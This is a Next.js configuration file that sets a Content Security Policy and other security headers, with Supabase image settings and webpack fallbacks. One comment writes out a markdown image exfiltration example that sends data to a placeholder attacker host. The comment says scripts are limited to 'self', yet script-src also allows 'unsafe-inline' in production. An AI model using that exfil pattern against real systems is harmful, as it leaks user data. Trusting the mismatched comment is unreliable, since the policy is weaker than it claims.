import createNextIntlPlugin from 'next-intl/plugin'

const withNextIntl = createNextIntlPlugin('./src/i18n.ts')

// L5 — Content Security Policy.
// Goal: ensure that any user-controlled string that accidentally renders as
// HTML (today everything goes through React's auto-escape, but the policy is
// defence in depth) cannot reach an attacker-controlled host. The two most
// important directives below:
//   * img-src: only same-origin, data: URIs, blobs, and Supabase storage.
//     Stops `![](https://attacker/?d=...)` style exfil if a markdown renderer
//     is ever added.
//   * connect-src: only same-origin and Supabase. Stops fetch/XHR exfil from
//     any client code an attacker manages to inject.
//
// 'unsafe-inline' on style-src is required by Tailwind/CSS-in-JS. Scripts use
// 'self'; in development we additionally allow 'unsafe-eval' for Next's hot
// reloader. If we later move to nonce-based CSP we can drop 'unsafe-inline'
// from style-src too.
function buildCsp() {
  const isDev = process.env.NODE_ENV !== 'production'
  const scriptExtra = isDev ? " 'unsafe-eval' 'unsafe-inline'" : " 'unsafe-inline'"

  return [
    "default-src 'self'",
    `script-src 'self'${scriptExtra}`,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob: https://*.supabase.co",
    "font-src 'self' data:",
    "connect-src 'self' https://*.supabase.co wss://*.supabase.co",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ].join('; ')
}

const SECURITY_HEADERS = [
  { key: 'Content-Security-Policy', value: buildCsp() },
  { key: 'X-Content-Type-Options',  value: 'nosniff' },
  { key: 'X-Frame-Options',         value: 'DENY' },
  { key: 'Referrer-Policy',         value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy',      value: 'camera=(), microphone=(), geolocation=()' },
]

// 没有 NEXT_PUBLIC_SUPABASE_URL 时不注册远程图片源，而不是抛错终止配置加载：
// next lint 也会加载本文件，而 CI 的 lint 步骤（copy.yml / check.yml）不设这个
// 环境变量 —— 抛错会把两个现在通过的门禁改成必挂。缺变量时的行为与加这段配置
// 之前一致（没有远程图片源），生产环境有变量所以正常工作。
// 变量存在但不是合法 URL（`new URL()` 抛错）按同样的逻辑处理：不让配置加载
// 失败，只是不注册远程图片源，并打一条 warn 方便定位——这种情况本身是配置
// 错误，但让它表现为“图片走 next/image 优化失败”比“整个应用起不来”更安全。
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL
let remotePatterns = []
if (supabaseUrl) {
  try {
    const supabaseHost = new URL(supabaseUrl).hostname
    remotePatterns = [
      {
        protocol: 'https',
        hostname: supabaseHost,
        port: '',
        pathname: '/storage/v1/object/public/site-media/**',
      },
    ]
  } catch {
    console.warn('[next.config] NEXT_PUBLIC_SUPABASE_URL is not a valid URL — skipping site-media remotePattern')
  }
}

/** @type {import('next').NextConfig} */
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: SECURITY_HEADERS,
      },
    ]
  },
  images: {
    remotePatterns,
  },
  webpack: (config, { isServer }) => {
    if (!isServer) {
      // global-agent uses Node.js built-ins (net, tls, fs) that don't exist in
      // the browser. Since global-agent is only called server-side (instrumentation),
      // we stub these modules out for the browser bundle so webpack doesn't error.
      config.resolve.fallback = {
        ...config.resolve.fallback,
        net: false,
        tls: false,
        fs:  false,
      }
    }
    return config
  },
  experimental: {
    serverComponentsExternalPackages: ['@anthropic-ai/sdk', '@supabase/supabase-js', '@supabase/ssr', 'global-agent', 'undici'],
    instrumentationHook: true,
  },
}

export default withNextIntl(nextConfig)
